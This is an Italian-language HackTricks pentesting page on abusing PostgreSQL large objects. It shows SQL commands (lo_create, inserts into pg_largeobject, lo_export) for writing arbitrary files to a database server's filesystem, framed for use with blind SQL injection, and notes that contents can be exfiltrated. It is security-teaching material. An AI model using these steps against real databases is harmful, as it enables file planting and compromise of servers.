{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### Oggetti di grandi dimensioni PostgreSQL

PostgreSQL offre una struttura nota come **oggetti di grandi dimensioni**, accessibile tramite la tabella `pg_largeobject`, progettata per memorizzare grandi tipi di dati, come immagini o documenti PDF. Questo approccio √® vantaggioso rispetto alla funzione `COPY TO` in quanto consente l'**esportazione dei dati nel file system**, garantendo che venga mantenuta una replica esatta del file originale.

Per **memorizzare un file completo** all'interno di questa tabella, deve essere creato un oggetto nella tabella `pg_largeobject` (identificato da un LOID), seguito dall'inserimento di chunk di dati, ciascuno di 2KB, in questo oggetto. √à fondamentale che questi chunk siano esattamente di 2KB (con la possibile eccezione dell'ultimo chunk) per garantire che la funzione di esportazione funzioni correttamente.

Per **dividere i tuoi dati binari** in chunk di 2KB, possono essere eseguiti i seguenti comandi:
```bash
split -b 2048 your_file # Creates 2KB sized files
```
Per codificare ogni file in Base64 o Hex, possono essere utilizzati i seguenti comandi:
```bash
base64 -w 0 <Chunk_file> # Encodes in Base64 in one line
xxd -ps -c 99999999999 <Chunk_file> # Encodes in Hex in one line
```
**Importante**: Quando si automatizza questo processo, assicurarsi di inviare chunk di 2KB di byte in chiaro. I file codificati in esadecimale richiederanno 4KB di dati per chunk a causa del raddoppio delle dimensioni, mentre i file codificati in Base64 seguono la formula `ceil(n / 3) * 4`.

Il contenuto degli oggetti di grandi dimensioni pu√≤ essere visualizzato per scopi di debug utilizzando:
```sql
select loid, pageno, encode(data, 'escape') from pg_largeobject;
```
#### Utilizzando `lo_creat` e Base64

Per memorizzare dati binari, viene prima creato un LOID:
```sql
SELECT lo_creat(-1);       -- Creates a new, empty large object
SELECT lo_create(173454);  -- Attempts to create a large object with a specific OID
```
In situazioni che richiedono un controllo preciso, come sfruttare un Blind SQL Injection, `lo_create` √® preferito per specificare un LOID fisso.

I chunk di dati possono quindi essere inseriti come segue:
```sql
INSERT INTO pg_largeobject (loid, pageno, data) VALUES (173454, 0, decode('<B64 chunk1>', 'base64'));
INSERT INTO pg_largeobject (loid, pageno, data) VALUES (173454, 1, decode('<B64 chunk2>', 'base64'));

```
Per esportare e potenzialmente eliminare l'oggetto di grandi dimensioni dopo l'uso:
```sql
SELECT lo_export(173454, '/tmp/your_file');
SELECT lo_unlink(173454);  -- Deletes the specified large object
```
#### Utilizzando `lo_import` & Hex

La funzione `lo_import` pu√≤ essere utilizzata per creare e specificare un LOID per un oggetto di grandi dimensioni:
```sql
select lo_import('/path/to/file');
select lo_import('/path/to/file', 173454);
```
Dopo la creazione dell'oggetto, i dati vengono inseriti per pagina, assicurando che ogni blocco non superi i 2KB:
```sql
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=0;
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=1;
```
Per completare il processo, i dati vengono esportati e l'oggetto di grandi dimensioni viene eliminato:
```sql
select lo_export(173454, '/path/to/your_file');
select lo_unlink(173454);  -- Deletes the specified large object
```
### Limitazioni

Si nota che **i grandi oggetti possono avere ACL** (Liste di Controllo degli Accessi), potenzialmente limitando l'accesso anche agli oggetti creati dal tuo utente. Tuttavia, oggetti pi√π vecchi con ACL permissive potrebbero essere ancora accessibili per l'exfiltrazione dei contenuti.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
